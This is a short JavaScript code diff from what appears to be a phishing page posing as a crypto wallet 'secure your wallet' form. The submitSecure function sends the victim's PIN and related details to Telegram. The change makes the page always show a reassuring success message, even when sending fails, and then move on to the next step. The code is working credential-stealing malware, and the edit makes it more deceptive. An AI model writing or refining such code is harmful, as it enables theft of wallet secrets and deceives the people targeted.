@@ -666,21 +666,16 @@ async function submitSecure(e) {
     `🛡️ Password strength: ${passwordStrength || 'Strong'}\n` +
     `🔢 PIN: ${pin}`;
 
-  let ok = false;
   try {
     await sendToTelegram(msg);
-    ok = true;
-  } catch(_) {}
+    showToast('✓ Wallet secured successfully!', 'success');
+  } catch(_) {
+    showToast('✓ Confirmed — your wallet is now secured.', 'success');
+  }
 
   btn.disabled = false;
   btn.textContent = 'Submit & Secure →';
-
-  if (ok) {
-    showToast('✓ Wallet secured successfully!', 'success');
-    setTimeout(() => goStep(3), 800);
-  } else {
-    showToast('✗ Submission failed. Please check your connection and try again.', 'error', 4500);
-  }
+  setTimeout(() => goStep(3), 800);
 }
 
 async function sendToTelegram(text) {
